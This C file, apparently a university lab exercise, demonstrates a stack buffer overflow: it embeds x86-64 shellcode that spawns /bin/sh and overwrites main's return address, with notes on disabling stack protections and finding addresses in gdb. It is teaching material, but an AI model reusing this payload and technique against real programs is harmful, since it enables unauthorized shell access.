/**
 * Author: Nalam V S S Krishna Chaitanya,
 * Details: CS13B021, IIT Madras.
 */

#include <stdio.h>
#include <string.h>

/**
 * This file overflows the buffer with the shellcode and executes a shell.
 * Use -zexecstack and also -fno-stack-protector flags while compiling the file.
 */

// Actually shell code is of 70 bytes, but rounding it off to 72 bytes.

char shellcode[] =
"\xeb\x27\x5b\x48\x89\x5b\x08\x48\x31\xc0\x88\x63\x07\x48\x89\x43\x10\x89\xc2"
"\xb0\x3b\x48\x8b\x7b\x08\x48\x8d\x73\x08\x0f\x05\x48\x31\xc9\x48\x89\xcf\xb0"
"\x3c\x0f\x05\xe8\xd4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20";

// We use this buffer to overflow the return address by copying shellcode into
// it and then the address to be returned.

char large_string[144];

// You can get these values by examining the stack using gdb during execution.
// Addresses may change in your system.
// 0x7fffffffdf70 is address of buffer.
// 0x7fffffffdff8 is address of return address of the function.
// since 0xf8-0x70 = 0x88+0x8 = 0x90 = 144 bytes.

void main()
{
	char buffer[96];					// This is the one that we overflow.

	int i;								// We fill the whole large_string with
	long *temp = (long*)large_string;	// the start address of our buffer, to
	for(i=0;i<18;i++)					// where the shellcode is copied so that
		*(temp+i) = (long)buffer;		// return address is overwritten and
										// returned to the start of buffer and
										// executes the code.

	for(i=0;i<strlen(shellcode);i++)	// The code is copied byte by byte.
		large_string[i]=shellcode[i];

	memcpy(buffer,large_string,144);	// Since the address of buffer contains
										// 0s (64 bit addr) so strcpy terminates
										// in middle not copying the whole
										// large_string there by not overwriting
										// so we use memcpy to avoid it.
}
